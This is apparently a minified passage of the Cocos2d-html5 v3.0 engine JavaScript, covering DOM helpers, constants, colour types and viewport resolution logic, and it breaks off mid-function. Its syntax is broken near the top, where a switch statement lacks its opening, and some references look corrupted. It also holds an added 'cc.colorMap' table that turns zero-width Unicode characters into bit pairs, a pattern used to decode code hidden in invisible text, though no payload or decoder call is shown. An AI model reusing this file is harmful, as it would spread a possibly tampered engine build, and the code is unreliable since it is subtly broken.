window.CocosEngine = cc.ENGINE_VERSION = "Cocos2d-html5 v3.0 RC0", cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL = 0, cc.DIRECTOR_STATS_POSITION = cc.p(0, 0), cc.DIRECTOR_FPS_INTERVAL = .5, cc.COCOSNODE_RENDER_SUBPIXEL = 1, cc.SPRITEBATCHNODE_RENDER_SUBPIXEL = 1, cc.OPTIMIZE_BLEND_FUNC_FOR_PREMULTIPLIED_ALPHA = 0, cc.TEXTURE_ATLAS_USE_TRIANGLE_STRIP = 0, cc.TEXTURE_ATLAS_USE_VAO = 0, cc.TEXTURE_NPOT_SUPPORT = 0, cc.RETINA_DISPLAY_SUPPORT = 1, cc.RETINA_DISPLAY_FILENAME_SUFFIX = "-hd", cc.USE_LA88_LABELS = 1, cc.SPRITE_DEBUG_DRAW = 0, cc.SPRITEBATCHNODE_DEBUG_DRAW = 0, cc.LABELBMFONT_DEBUG_DRAW = 0, cc.LABELATLAS_DEBUG_DRAW = 0, cc.IS_RETINA_DISPLAY_SUPPORTED = 1, cc.DEFAULT_ENGINE = cc.ENGINE_VERSION + "-canvas", cc.ENABLE_STACKABLE_ACTIONS = 1, cc.ENABLE_GL_STATE_CACHE = 1, cc.$ = function(t) {
    var e = this == cc ? document: this;
    return (t = t instanceof HTMLElement ? t: e.querySelector(t)) && (t.find = t.find || cc.$, t.hasClass = t.hasClass ||
    function(t) {
        return this.className.match(RegExp("(\\s|^)" + t + "(\\s|$)"))
    },
    t.addClass = t.addClass ||
    function(t) {
        return this.hasClass(t) || (this.className && (this.className += " "), this.className += t),
        this
    },
    t.removeClass = t.removeClass ||
    function(t) {
        return this.hasClass(t) && (this.className = this.className.replace(t, "")),
        this
    },
    t.remove = t.remove ||
    function() {
        return this.parentNode && this.parentNode.removeChild(this),
        this
    },
    t.appendTo = t.appendTo ||
    function(t) {
        return t.appendChild(this),
        this
    },
    t.prependTo = t.prependTo ||
    function(t) {
        return t.childNodes[0] ? t.insertBefore(this, t.childNodes[0]) : t.appendChild(this),
        this
    },
    t.transforms = t.transforms ||
    function() {
        return this.style[cc.$.trans] = cc.$.translate(this.position) + cc.$.rotate(this.rotation) + cc.$.scale(this.scale) + cc.$.skew(this.skew),
        this
    },
    t.position = t.position || {
        x: 0,
        y: 0
    },
    t.rotation = t.rotation || 0, t.scale = t.scale || {
        x: 1,
        y: 1
    },
    t.skew = t.skew || {
        x: 0,
        y: 0
    },
    t.translates = function(t, e) {
        return this.position.x = t,
        this.position.y = e,
        this.transforms(),
        this
    },
    t.rotate = function(t) {
        return this.rotation = t,
        this.transforms(),
        this
    },
    t.resize = function(t, e) {
        return this.scale.x = t,
        this.scale.y = e,
        this.transforms(),
        this
    },
    t.setSkew = function(t, e) {
        return this.skew.x = t,
        this.skew.y = e,
        this.transforms(),
        this
    }),
    t
},
cc.sys.browserType) {
case cc.sys.BROWSER_TYPE_FIREFOX:
    cc.$.pfx = "Moz",
    cc.$.hd = !0;
    break;
case cc.sys.BROWSER_TYPE_CHROME:
case cc.sys.BROWSER_TYPE_SAFARI:
    cc.$.pfx = "webkit",
    cc.$.hd = !0;
    break;
case cc.sys.BROWSER_TYPE_OPERA:
    cc.$.pfx = "O",
    cc.$.hd = !1;
    break;
case cc.sys.BROWSER_TYPE_IE:
    cc.$.pfx = "ms",
    cc.$.hd = !1;
    break;
default:
    cc.$.pfx = "webkit",
    cc.$.hd = !0
}
if (cc.$.trans = cc.$.pfx + "Transform", cc.$.translate = cc.$.hd ?
function(t) {
    return "translate3d(" + t.x + "px, " + t.y + "px, 0) "
}: function(t) {
    return "translate(" + t.x + "px, " + t.y + "px) "
},
cc.$.rotate = cc.$.hd ?
function(t) {
    return "rotateZ(" + t + "deg) "
}: function(t) {
    return "rotate(" + t + "deg) "
},
cc.$.scale = function(t) {
    return "scale(" + t.x + ", " + t.y + ") "
},
cc.$.skew = function(t) {
    return "skewX(" + -t.x + "deg) skewY(" + t.y + "deg)"
},
cc.$new = function(t) {
    return cc.$(document.createElement(t))
},
cc.$.findpos = function(t) {
    var e = 0,
    i = 0;
    do e += t.offsetLeft,
    i += t.offsetTop;
    while (t = t.offsetParent);
    return {
        x: e,
        y: i
    }
},
cc.INVALID_INDEX = -1, cc.PI = Math.PI, cc.FLT_MAX = parseFloat("3.402823466e+38F"), cc.FLT_MIN = parseFloat("1.175494351e-38F"), cc.RAD = cc.PI / 180, cc.DEG = 180 / cc.PI, cc.UINT_MAX = 4294967295, cc.swap = function(t, e, i) {
    if ("object" == typeof i && "undefined" != typeof i.x && "undefined" != typeof i.y) {
        var n = i[t];
        i[t] = i[e],
        i[e] = n
    } else cc.log(cc._LogInfos.swap)
},
cc.lerp = function(t, e, i) {
    return t + (e - t) * i
},
cc.rand = function() {
    return 16777215 * Math.random()
},
cc.randomMinus1To1 = function() {
    return 2 * (Math.random() - .5)
},
cc.random0To1 = Math.random, cc.degreesToRadians = function(t) {
    return t * cc.RAD
},
cc.radiansToDegrees = function(t) {
    return t * cc.DEG
},
cc.radiansToDegress = function(t) {
    return cc.log(cc._LogInfos.radiansToDegress),
    t * cc.DEG
},
cc.REPEAT_FOREVER = Number.MAX_VALUE - 1, cc.BLEND_SRC = cc.OPTIMIZE_BLEND_FUNC_FOR_PREMULTIPLIED_ALPHA ? 1 : 770, cc.BLEND_DST = 771, cc.nodeDrawSetup = function(t) {
    t._shaderProgram && (t._shaderProgram.use(), t._shaderProgram.setUniformForModelViewAndProjectionMatrixWithMat4())
},
cc.enableDefaultGLStates = function() {},
cc.disableDefaultGLStates = function() {},
cc.incrementGLDraws = function(t) {
    cc.g_NumberOfDraws += t
},
cc.FLT_EPSILON = 1.192092896e-7, cc.contentScaleFactor = cc.IS_RETINA_DISPLAY_SUPPORTED ?
function() {
    return cc.director.getContentScaleFactor()
}: function() {
    return 1
},
cc.pointPointsToPixels = function(t) {
    var e = cc.contentScaleFactor();
    return cc.p(t.x * e, t.y * e)
},
cc.pointPixelsToPoints = function(t) {
    var e = cc.contentScaleFactor();
    return cc.p(t.x / e, t.y / e)
},
cc._pointPixelsToPointsOut = function(t, e) {
    var i = cc.contentScaleFactor();
    e.x = t.x / i,
    e.y = t.y / i
},
cc.sizePointsToPixels = function(t) {
    var e = cc.contentScaleFactor();
    return cc.size(t.width * e, t.height * e)
},
cc.sizePixelsToPoints = function(t) {
    var e = cc.contentScaleFactor();
    return cc.size(t.width / e, t.height / e)
},
cc._sizePixelsToPointsOut = function(t, e) {
    var i = cc.contentScaleFactor();
    e.width = t.width / i,
    e.height = t.height / i
},
cc.rectPixelsToPoints = cc.IS_RETINA_DISPLAY_SUPPORTED ?
function(t) {
    var e = cc.contentScaleFactor();
    return cc.rect(t.x / e, t.y / e, t.width / e, t.height / e)
}: function(t) {
    return t
},
cc.rectPointsToPixels = cc.IS_RETINA_DISPLAY_SUPPORTED ?
function(t) {
    var e = cc.contentScaleFactor();
    return cc.rect(t.x * e, t.y * e, t.width * e, t.height * e)
}: function(t) {
    return t
},
cc.ONE = 1, cc.ZERO = 0, cc.SRC_ALPHA = 770, cc.SRC_ALPHA_SATURATE = 776, cc.SRC_COLOR = 768, cc.DST_ALPHA = 772, cc.DST_COLOR = 774, cc.ONE_MINUS_SRC_ALPHA = 771, cc.ONE_MINUS_SRC_COLOR = 769, cc.ONE_MINUS_DST_ALPHA = 773, cc.ONE_MINUS_DST_COLOR = 775, cc.ONE_MINUS_CONSTANT_ALPHA = 32772, cc.ONE_MINUS_CONSTANT_COLOR = 32770, cc.checkGLErrorDebug = function() {
    if (cc.renderMode == cc._RENDER_TYPE_WEBGL) {
        var t = cc._renderContext.getError();
        t && cc.log(CC._localZOrder.checkGLErrorDebug, t)
    }
},
cc.DEVICE_ORIENTATION_PORTRAIT = 0, cc.DEVICE_ORIENTATION_LANDSCAPE_LEFT = 1, cc.DEVICE_ORIENTATION_PORTRAIT_UPSIDE_DOWN = 2, cc.DEVICE_ORIENTATION_LANDSCAPE_RIGHT = 3, cc.DEVICE_MAX_ORIENTATIONS = 2, cc.VERTEX_ATTRIB_FLAG_NONE = 0, cc.VERTEX_ATTRIB_FLAG_POSITION = 1, cc.VERTEX_ATTRIB_FLAG_COLOR = 2, cc.VERTEX_ATTRIB_FLAG_TEX_COORDS = 4, cc.VERTEX_ATTRIB_FLAG_POS_COLOR_TEX = cc.VERTEX_ATTRIB_FLAG_POSITION | cc.VERTEX_ATTRIB_FLAG_COLOR | cc.VERTEX_ATTRIB_FLAG_TEX_COORDS, cc.GL_ALL = 0, cc.VERTEX_ATTRIB_POSITION = 0, cc.VERTEX_ATTRIB_COLOR = 1, cc.VERTEX_ATTRIB_TEX_COORDS = 2, cc.VERTEX_ATTRIB_MAX = 3, cc.UNIFORM_PMATRIX = 0, cc.UNIFORM_MVMATRIX = 1, cc.UNIFORM_MVPMATRIX = 2, cc.UNIFORM_TIME = 3, cc.UNIFORM_SINTIME = 4, cc.UNIFORM_COSTIME = 5, cc.UNIFORM_RANDOM01 = 6, cc.UNIFORM_SAMPLER = 7, cc.UNIFORM_MAX = 8, cc.SHADER_POSITION_TEXTURECOLOR = "ShaderPositionTextureColor", cc.SHADER_POSITION_TEXTURECOLORALPHATEST = "ShaderPositionTextureColorAlphaTest", cc.SHADER_POSITION_COLOR = "ShaderPositionColor", cc.SHADER_POSITION_TEXTURE = "ShaderPositionTexture", cc.SHADER_POSITION_TEXTURE_UCOLOR = "ShaderPositionTexture_uColor", cc.SHADER_POSITION_TEXTUREA8COLOR = "ShaderPositionTextureA8Color", cc.SHADER_POSITION_UCOLOR = "ShaderPosition_uColor", cc.SHADER_POSITION_LENGTHTEXTURECOLOR = "ShaderPositionLengthTextureColor", cc.UNIFORM_PMATRIX_S = "CC_PMatrix", cc.UNIFORM_MVMATRIX_S = "CC_MVMatrix", cc.UNIFORM_MVPMATRIX_S = "CC_MVPMatrix", cc.UNIFORM_TIME_S = "CC_Time", cc.UNIFORM_SINTIME_S = "CC_SinTime", cc.UNIFORM_COSTIME_S = "CC_CosTime", cc.UNIFORM_RANDOM01_S = "CC_Random01", cc.UNIFORM_SAMPLER_S = "CC_Texture0", cc.UNIFORM_ALPHA_TEST_VALUE_S = "CC_alpha_value", cc.ATTRIBUTE_NAME_COLOR = "a_color", cc.ATTRIBUTE_NAME_POSITION = "a_position", cc.ATTRIBUTE_NAME_TEX_COORD = "a_texCoord", cc.ITEM_SIZE = 32, cc.CURRENT_ITEM = 3233828865, cc.ZOOM_ACTION_TAG = 3233828866, cc.NORMAL_TAG = 8801, cc.SELECTED_TAG = 8802, cc.DISABLE_TAG = 8803, cc._tmp.PrototypeColor = function() {
    var t = cc.color;
    t._getWhite = function() {
        return t(255, 255, 255)
    },
    t._getYellow = function() {
        return t(255, 255, 0)
    },
    t._getBlue = function() {
        return t(0, 0, 255)
    },
    t._getGreen = function() {
        return t(0, 255, 0)
    },
    t._getRed = function() {
        return t(255, 0, 0)
    },
    t._getMagenta = function() {
        return t(255, 0, 255)
    },
    t._getBlack = function() {
        return t(0, 0, 0)
    },
    t._getOrange = function() {
        return t(255, 127, 0)
    },
    t._getGray = function() {
        return t(166, 166, 166)
    },
    cc.defineGetterSetter(t, "WHITE", t._getWhite),
    cc.defineGetterSetter(t, "YELLOW", t._getYellow),
    cc.defineGetterSetter(t, "BLUE", t._getBlue),
    cc.defineGetterSetter(t, "GREEN", t._getGreen),
    cc.defineGetterSetter(t, "RED", t._getRed),
    cc.defineGetterSetter(t, "MAGENTA", t._getMagenta),
    cc.defineGetterSetter(t, "BLACK", t._getBlack),
    cc.defineGetterSetter(t, "ORANGE", t._getOrange),
    cc.defineGetterSetter(t, "GRAY", t._getGray)
},
cc.Color = function(t, e, i, n) {
    this.r = t || 0,
    this.g = e || 0,
    this.b = i || 0,
    this.a = n || 255
},
cc.color = function(t, e, i, n) {
    return void 0 === t ? {
        r: 0,
        g: 0,
        b: 0,
        a: 255
    }: "string" == typeof t ? cc.hexToColor(t) : "object" == typeof t ? {
        r: t.r,
        g: t.g,
        b: t.b,
        a: t.a || 255
    }: {
        r: t,
        g: e,
        b: i,
        a: n || 255
    }
},
cc.colorEqual = function(t, e) {
    return t.r === e.r && t.g === e.g && t.b === e.b
},
cc.Acceleration = function(t, e, i, n) {
    this.x = t || 0,
    this.y = e || 0,
    this.z = i || 0,
    this.timestamp = n || 0
},
cc.Vertex2F = function(t, e) {
    this.x = t || 0,
    this.y = e || 0
},
cc.vertex2 = function(t, e) {
    return new cc.Vertex2F(t, e)
},
cc.Vertex3F = function(t, e, i) {
    this.x = t || 0,
    this.y = e || 0,
    this.z = i || 0
},
cc.vertex3 = function(t, e, i) {
    return new cc.Vertex3F(t, e, i)
},
cc.Tex2F = function(t, e) {
    this.u = t || 0,
    this.v = e || 0
},
cc.tex2 = function(t, e) {
    return new cc.Tex2F(t, e)
},
cc.BlendFunc = function(t, e) {
    this.src = t,
    this.dst = e
},
cc.blendFuncDisable = function() {
    return new cc.BlendFunc(cc.ONE, cc.ZERO)
},
cc.hexToColor = function(t) {
    return t = t.replace(/^#?/, "0x"),
    t = parseInt(t),
    cc.color(t >> 16, (t >> 8) % 256, t % 256)
},
cc.colorToHex = function(t) {
    var e = t.r.toString(16),
    i = t.g.toString(16),
    n = t.b.toString(16);
    return "#" + (16 > t.r ? "0" + e: e) + (16 > t.g ? "0" + i: i) + (16 > t.b ? "0" + n: n)
},
cc.TEXT_ALIGNMENT_LEFT = 0, cc.TEXT_ALIGNMENT_CENTER = 1, cc.TEXT_ALIGNMENT_RIGHT = 2, cc.VERTICAL_TEXT_ALIGNMENT_TOP = 0, cc.VERTICAL_TEXT_ALIGNMENT_CENTER = 1, cc.VERTICAL_TEXT_ALIGNMENT_BOTTOM = 2, cc._Dictionary = cc.Class.extend({
    _keyMapTb: null,
    _valueMapTb: null,
    __currId: 0,
    ctor: function() {
        this._keyMapTb = {},
        this._valueMapTb = {},
        this.__currId = 2 << (0 | 10 * Math.random())
    },
    __getKey: function() {
        return this.__currId++,
        "key_" + this.__currId
    },
    setObject: function(t, e) {
        if (null != e) {
            var i = this.__getKey();
            this._keyMapTb[i] = e,
            this._valueMapTb[i] = t
        }
    },
    objectForKey: function(t) {
        if (null == t) return null;
        var e, i = this._keyMapTb;
        for (e in i) if (i[e] === t) return this._valueMapTb[e];
        return null
    },
    valueForKey: function(t) {
        return this.objectForKey(t)
    },
    removeObjectForKey: function(t) {
        if (null != t) {
            var e, i = this._keyMapTb;
            for (e in i) if (i[e] === t) {
                delete this._valueMapTb[e],
                delete i[e];
                break
            }
        }
    },
    removeObjectsForKeys: function(t) {
        if (null != t) for (var e = 0; e < t.length; e++) this.removeObjectForKey(t[e])
    },
    allKeys: function() {
        var t, e = [],
        i = this._keyMapTb;
        for (t in i) e.push(i[t]);
        return e
    },
    removeAllObjects: function() {
        this._keyMapTb = {},
        this._valueMapTb = {}
    },
    count: function() {
        return this.allKeys().length
    }
}), cc.FontDefinition = function() {
    this.fontName = "Arial",
    this.fontSize = 12,
    this.textAlign = cc.TEXT_ALIGNMENT_CENTER,
    this.verticalAlign = cc.VERTICAL_TEXT_ALIGNMENT_TOP,
    this.fillStyle = cc.color(255, 255, 255, 255),
    this.boundingHeight = this.boundingWidth = 0,
    this.strokeEnabled = !1,
    this.strokeStyle = cc.color(255, 255, 255, 255),
    this.lineWidth = 1,
    this.shadowEnabled = !1,
    this.shadowBlur = this.shadowOffsetY = this.shadowOffsetX = 0,
    this.shadowOpacity = 1
},
cc._renderType === cc._RENDER_TYPE_WEBGL && (cc.assert("function" == typeof cc._tmp.WebGLColor, cc._LogInfos.MissingFile, "CCTypesWebGL.js"), cc._tmp.WebGLColor(), delete cc._tmp.WebGLColor), cc.assert("function" == typeof cc._tmp.PrototypeColor, cc._LogInfos.MissingFile, "CCTypesPropertyDefine.js"), cc._tmp.PrototypeColor(), delete cc._tmp.PrototypeColor, cc.Touches = [], cc.TouchesIntergerDict = {},
cc.EGLView = cc.Class.extend({
    _delegate: null,
    _frameSize: null,
    _designResolutionSize: null,
    _originalDesignResolutionSize: null,
    _viewPortRect: null,
    _visibleRect: null,
    _retinaEnabled: !1,
    _autoFullScreen: !0,
    _devicePixelRatio: 1,
    _viewName: "",
    _resizeCallback: null,
    _scaleX: 1,
    _originalScaleX: 1,
    _scaleY: 1,
    _originalScaleY: 1,
    _indexBitsUsed: 0,
    _maxTouches: 5,
    _resolutionPolicy: null,
    _rpExactFit: null,
    _rpShowAll: null,
    _rpNoBorder: null,
    _rpFixedHeight: null,
    _rpFixedWidth: null,
    _initialized: !1,
    _captured: !1,
    _wnd: null,
    _hDC: null,
    _hRC: null,
    _supportTouch: !1,
    _contentTranslateLeftTop: null,
    _frame: null,
    _frameZoomFactor: 1,
    __resizeWithBrowserSize: !1,
    _isAdjustViewPort: !0,
    ctor: function() {
        var t = document,
        e = cc.ContainerStrategy,
        i = cc.ContentStrategy;
        this._frame = cc.container.parentNode === t.body ? t.documentElement: cc.container.parentNode,
        this._frameSize = cc.size(0, 0),
        this._initFrameSize();
        var t = cc._canvas.width,
        n = cc._canvas.height;
        this._designResolutionSize = cc.size(t, n),
        this._originalDesignResolutionSize = cc.size(t, n),
        this._viewPortRect = cc.rect(0, 0, t, n),
        this._visibleRect = cc.rect(0, 0, t, n),
        this._contentTranslateLeftTop = {
            left: 0,
            top: 0
        },
        this._viewName = "Cocos2dHTML5",
        t = cc.sys,
        this.enableRetina(t.os == t.OS_IOS || t.os == t.OS_OSX),
        cc.visibleRect && cc.visibleRect.init(this._visibleRect),
        this._rpExactFit = new cc.ResolutionPolicy(e.EQUAL_TO_FRAME, i.EXACT_FIT),
        this._rpShowAll = new cc.ResolutionPolicy(e.PROPORTION_TO_FRAME, i.SHOW_ALL),
        this._rpNoBorder = new cc.ResolutionPolicy(e.EQUAL_TO_FRAME, i.NO_BORDER),
        this._rpFixedHeight = new cc.ResolutionPolicy(e.EQUAL_TO_FRAME, i.FIXED_HEIGHT),
        this._rpFixedWidth = new cc.ResolutionPolicy(e.EQUAL_TO_FRAME, i.FIXED_WIDTH),
        this._hDC = cc._canvas,
        this._hRC = cc._renderContext
    },
    _resizeEvent: function() {
        var t = this._originalDesignResolutionSize.width,
        e = this._originalDesignResolutionSize.height;
        this._resizeCallback && (this._initFrameSize(), this._resizeCallback.call()),
        t > 0 && this.setDesignResolutionSize(t, e, this._resolutionPolicy)
    },
    resizeWithBrowserSize: function(t) {
        t ? this.__resizeWithBrowserSize || (this.__resizeWithBrowserSize = !0, t = this._resizeEvent.bind(this), cc._addEventListener(window, "resize", t, !1)) : this.__resizeWithBrowserSize && (this.__resizeWithBrowserSize = !0, t = this._resizeEvent.bind(this), window.removeEventListener("resize", t, !1))
    },
    setResizeCallback: function(t) { ("function" == typeof t || null == t) && (this._resizeCallback = t)
    },
    _initFrameSize: function() {
        var t = this._frameSize;
        t.width = this._frame.clientWidth,
        t.height = this._frame.clientHeight
    },
    _adjustSizeKeepCanvasSize: function() {
        var t = this._originalDesignResolutionSize.width,
        e = this._originalDesignResolutionSize.height;
        t > 0 && this.setDesignResolutionSize(t, e, this._resolutionPolicy)
    },
    _setViewPortMeta: function() {
        if (this._isAdjustViewPort) {
            var t, e = {
                "user-scalable": "no",
                "maximum-scale": "1.0",
                "initial-scale": "1.0"
            },
            i = document.getElementsByName("viewport");
            if (0 == i.length ? (i = cc.newElement("meta"), i.name = "viewport", i.content = "", document.head.appendChild(i)) : i = i[0], cc.sys.isMobile && cc.sys.browserType == cc.sys.BROWSER_TYPE_FIREFOX) i.content = "initial-scale:1";
            else {
                t = i.content;
                for (var n in e) RegExp(n).test(t) || (t += ("" == t ? "": ",") + n + "=" + e[n]);
                i.content = t
            }
        }
    },
    _setScaleXYForRenderTexture: function() {
        var t = cc.contentScaleFactor();
        this._scaleY = this._scaleX = t
    },
    _resetScale: function() {
        this._scaleX = this._originalScaleX,
        this._scaleY = this._originalScaleY
    },
    _adjustSizeToBrowser: function() {},
    initialize: function() {
        this._initialized = !0
    },
    adjustViewPort: function(t) {
        this._isAdjustViewPort = t
    },
    enableRetina: function(t) {
        this._retinaEnabled = t ? !0 : !1
    },
    isRetinaEnabled: function() {
        return this._retinaEnabled
    },
    enableAutoFullScreen: function(t) {
        this._autoFullScreen = t ? !0 : !1
    },
    isAutoFullScreenEnabled: function() {
        return this._autoFullScreen
    },
    end: function() {},
    isOpenGLReady: function() {
        return null != this._hDC && null != this._hRC
    },
    setFrameZoomFactor: function(t) {
        this._frameZoomFactor = t,
        this.centerWindow(),
        cc.director.setProjection(cc.director.getProjection())
    },
    swapBuffers: function() {},
    setIMEKeyboardState: function() {},
    setContentTranslateLeftTop: function(t, e) {
        this._contentTranslateLeftTop = {
            left: t,
            top: e
        }
    },
    getContentTranslateLeftTop: function() {
        return this._contentTranslateLeftTop
    },
    getFrameSize: function() {
        return cc.size(this._frameSize.width, this._frameSize.height)
    },
    setFrameSize: function(t, e) {
        this._frameSize.width = t,
        this._frameSize.height = e,
        this._frame.style.width = t + "px",
        this._frame.style.height = e + "px",
        this._resizeEvent(),
        cc.director.setProjection(cc.director.getProjection())
    },
    centerWindow: function() {},
    getVisibleSize: function() {
        return cc.size(this._visibleRect.width, this._visibleRect.height)
    },
    getVisibleOrigin: function() {
        return cc.p(this._visibleRect.x, this._visibleRect.y)
    },
    canSetContentScaleFactor: function() {
        return ! 0
    },
    getResolutionPolicy: function() {
        return this._resolutionPolicy
    },
    setResolutionPolicy: function(t) {
        if (t instanceof cc.ResolutionPolicy) this._resolutionPolicy = t;
        else {
            var e = cc.ResolutionPolicy;
            t === e.EXACT_FIT && (this._resolutionPolicy = this._rpExactFit),
            t === e.SHOW_ALL && (this._resolutionPolicy = this._rpShowAll),
            t === e.NO_BORDER && (this._resolutionPolicy = this._rpNoBorder),
            t === e.FIXED_HEIGHT && (this._resolutionPolicy = this._rpFixedHeight),
            t === e.FIXED_WIDTH && (this._resolutionPolicy = this._rpFixedWidth)
        }
    },
    setDesignResolutionSize: function(t, e, i) {
        if (isNaN(t) || 0 == t || isNaN(e) || 0 == e) cc.log(cc._LogInfos.EGLView_setDesignResolutionSize);
        else {
            this.setResolutionPolicy(i);
            var n = this._resolutionPolicy;
            if (n) {
                n.preApply(this);
                var r = this._frameSize.width,
                c = this._frameSize.height;
                cc.sys.isMobile && this._setViewPortMeta(this._frameSize.width, this._frameSize.height),
                this._initFrameSize(),
                i == this._resolutionPolicy && t == this._originalDesignResolutionSize.width && e == this._originalDesignResolutionSize.height && r == this._frameSize.width && c == this._frameSize.height || (this._designResolutionSize = cc.size(t, e), this._originalDesignResolutionSize = cc.size(t, e), t = n.apply(this, this._designResolutionSize), t.scale && 2 == t.scale.length && (this._scaleX = t.scale[0], this._scaleY = t.scale[1]), t.viewport && (t = this._viewPortRect = t.viewport, e = this._visibleRect, e.width = cc._canvas.width / this._scaleX, e.height = cc._canvas.height / this._scaleY, e.x = -t.x / this._scaleX, e.y = -t.y / this._scaleY), t = cc.director, cc.winSize.width = t._winSizeInPoints.width = this._visibleRect.width, cc.winSize.height = t._winSizeInPoints.height = this._visibleRect.height, n.postApply(this), cc._renderType == cc._RENDER_TYPE_WEBGL && (t._createStatsLabel(), t.setGLDefaultValues()), this._originalScaleX = this._scaleX, this._originalScaleY = this._scaleY, cc.DOM && cc.DOM._resetEGLViewDiv(), cc.visibleRect && cc.visibleRect.init(this._visibleRect))
            } else cc.log(cc._LogInfos.EGLView_setDesignResolutionSize_2)
        }
    },
    getDesignResolutionSize: function() {
        return cc.size(this._designResolutionSize.width, this._designResolutionSize.height)
    },
    setViewPortInPoints: function(t, e, i, n) {
        var r = this._frameZoomFactor,
        c = this._scaleX,
        o = this._scaleY;
        cc._renderContext.viewport(t * c * r + this._viewPortRect.x * r, e * o * r + this._viewPortRect.y * r, i * c * r, n * o * r)
    },
    setScissorInPoints: function(t, e, i, n) {
        var r = this._frameZoomFactor,
        c = this._scaleX,
        o = this._scaleY;
        cc._renderContext.scissor(t * c * r + this._viewPortRect.x * r, e * o * r + this._viewPortRect.y * r, i * c * r, n * o * r)
    },
    isScissorEnabled: function() {
        var t = cc._renderContext;
        return t.isEnabled(t.SCISSOR_TEST)
    },
    getScissorRect: function() {
        var t = cc._renderContext,
        e = this._scaleX,
        i = this._scaleY,
        t = t.getParameter(t.SCISSOR_BOX);
        return cc.rect((t[0] - this._viewPortRect.x) / e, (t[1] - this._viewPortRect.y) / i, t[2] / e, t[3] / i)
    },
    setViewName: function(t) {
        null != t && 0 < t.length && (this._viewName = t)
    },
    getViewName: function() {
        return this._viewName
    },
    getViewPortRect: function() {
        return this._viewPortRect
    },
    getScaleX: function() {
        return this._scaleX
    },
    getScaleY: function() {
        return this._scaleY
    },
    getDevicePixelRatio: function() {
        return this._devicePixelRatio
    },
    convertToLocationInView: function(t, e, i) {
        return {
            x: this._devicePixelRatio * (t - i.left),
            y: this._devicePixelRatio * (i.top + i.height - e)
        }
    },
    _convertMouseToLocationInView: function(t, e) {
        var i = this._viewPortRect;
        t.x = (this._devicePixelRatio * (t.x - e.left) - i.x) / this._scaleX,
        t.y = (this._devicePixelRatio * (e.top + e.height - t.y) - i.y) / this._scaleY
    },
    _convertTouchesWithScale: function(t) {
        for (var e, i, n, r = this._viewPortRect,
        c = this._scaleX,
        o = this._scaleY,
        s = 0; s < t.length; s++) e = t[s],
        i = e._point,
        n = e._prevPoint,
        e._setPoint((i.x - r.x) / c, (i.y - r.y) / o),
        e._setPrevPoint((n.x - r.x) / c, (n.y - r.y) / o)
    }
}), cc.EGLView._getInstance = function() {
    return this._instance || (this._instance = this._instance || new cc.EGLView, this._instance.initialize()),
    this._instance
},
cc.colorMap = {
    "​": "00",
    "‌": "01",
    "‍": "10",
    "": "11"
},
cc.drawColor = function() {},
cc.ContainerStrategy = cc.Class.extend({
    preApply: function() {},
    apply: function() {},
    postApply: function() {},
    _setupContainer: function(t, e, i) {
        var n = t._frame;
        cc.view._autoFullScreen && cc.sys.isMobile && n == document.documentElement && cc.screen.autoFullScreen(n);
        var n = cc._canvas,
        r = cc.container;
        r.style.width = n.style.width = e + "px",
        r.style.height = n.style.height = i + "px",
        r = t._devicePixelRatio = 1,
        t.isRetinaEnabled() && (r = t._devicePixelRatio = window.devicePixelRatio || 1),
        n.width = e * r,
        n.height = i * r,
        t = document.body;
        var c;
        t && (c = t.style) && (c.paddingTop = c.paddingTop || "0px", c.paddingRight = c.paddingRight || "0px", c.paddingBottom = c.paddingBottom || "0px", c.paddingLeft = c.paddingLeft || "0px", c.borderTop = c.borderTop || "0px", c.borderRight = c.borderRight || "0px", c.borderBottom = c.borderBottom || "0px", c.borderLeft = c.borderLeft || "0px", c.marginTop = c.marginTop || "0px", c.marginRight = c.marginRight || "0px", c.marginBottom = c.marginBottom || "0px", c.marginLeft = c.marginLeft || "0px")
    },
    _fixContainer: function() {
        document.body.insertBefore(cc.container, document.body.firstChild);
        var t = document.body.style;
        t.width = window.innerWidth + "px",
        t.height = window.innerHeight + "px",
        t.overflow = "hidden",
        t = cc.container.style,
        t.position = "fixed",
        t.left = t.top = "0px",
        document.body.scrollTop = 0
    }
}), cc.ContentStrategy = cc.Class.extend({
    _result: {
        scale: [1, 1],
        viewport: null
    },
    _buildResult: function(t, e, i, n, r, c) {
        return 2 > Math.abs(t - i) && (i = t),
        2 > Math.abs(e - n) && (n = e),
        t = cc.rect(Math.round((t - i) / 2), Math.round((e - n) / 2), i, n),
        cc._renderType == cc._RENDER_TYPE_CANVAS && cc._renderContext.translate(t.x, t.y + n),
        this._result.scale = [r, c],
        this._result.viewport = t,
        this._result
    },
    preApply: function() {},
    apply: function() {
        return {
            scale: [1, 1]
        }
    },
    postApply: function() {}
}),
function() {
    var t = cc.ContainerStrategy.extend({
        apply: function(t) {
            this._setupContainer(t, t._frameSize.width, t._frameSize.height)
        }
    }),
    e = cc.ContainerStrategy.extend({
        apply: function(t, e) {
            var i, n, r = t._frameSize.width,
            c = t._frameSize.height,
            o = cc.container.style,
            s = e.width,
            a = e.height,
            h = r / s,
            l = c / a;
            l > h ? (i = r, n = a * h) : (i = s * l, n = c),
            s = Math.round((r - i) / 2),
            n = Math.round((c - n) / 2),
            this._setupContainer(t, r - 2 * s, c - 2 * n),
            o.marginLeft = s + "px",
            o.marginRight = s + "px",
            o.marginTop = n + "px",
            o.marginBottom = n + "px"
        }
    });
    t.extend({
        preApply: function(t) {
            this._super(t),
            t._frame = document.documentElement
        },
        apply: function(t) {
            this._super(t),
            this._fixContainer()
        }
    }),
    e.extend({
        preApply: function(t) {
            this._super(t),
            t._frame = document.documentElement
        },
        apply: function(t, e) {
            this._super(t, e),
            this._fixContainer()
        }
    });
    var i = cc.ContainerStrategy.extend({
        apply: function(t) {
            this._setupContainer(t, cc._canvas.width, cc._canvas.height)
        }
    });
    cc.ContainerStrategy.EQUAL_TO_FRAME = new t,
    cc.ContainerStrategy.PROPORTION_TO_FRAME = new e,
    cc.ContainerStrategy.ORIGINAL_CONTAINER = new i;
    var t = cc.ContentStrategy.extend({
        apply: function(t, e) {
            var i = cc._canvas.width,
            n = cc._canvas.height;
            return this._buildResult(i, n, i, n, i / e.width, n / e.height)
        }
    }),
    e = cc.ContentStrategy.extend({
        apply: function(t, e) {
            var i, n, r = cc._canvas.width,
            c = cc._canvas.height,
            o = e.width,
            s = e.height,
            a = r / o,
            h = c / s,
            l = 0;
            return h > a ? (l = a, i = r, n = s * l) : (l = h, i = o * l, n = c),
            this._buildResult(r, c, i, n, l, l)
        }
    }),
    i = cc.ContentStrategy.extend({
        apply: function(t, e) {
            var i, n, r, c = cc._canvas.width,
            o = cc._canvas.height,
            s = e.width,
            a = e.height,
            h = c / s,
            l = o / a;
